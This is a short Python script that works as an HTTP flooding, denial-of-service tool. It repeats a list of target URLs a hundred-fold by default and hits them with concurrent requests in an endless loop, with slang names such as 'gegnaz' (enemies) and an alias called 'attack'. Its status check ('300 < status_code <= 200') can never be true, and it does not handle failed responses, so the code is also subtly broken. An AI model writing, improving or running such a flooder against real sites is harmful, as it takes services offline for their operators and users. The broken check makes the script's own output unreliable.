import typer
import grequests

from typing import List

attack = grequests.map


def _main(gegnaz: List[str], factor: int = 100, method: str = "get"):
    klatschaz = gegnaz * factor
    gmethod = getattr(grequests, method)
    while True:
        # wo sind die gegnaz
        lutschaz = (gmethod(u) for u in klatschaz)
        responses = attack(lutschaz)
        for i, response in enumerate(responses):
            if 300 < response.status_code <= 200:
                typer.secho(f"{klatschaz[i]} down lel..", fg="green")
            else:
                typer.secho(f"{klatschaz[i]} still up lel..", fg="red")

def main():
    typer.run(_main)

__all__ = [ "main" ]
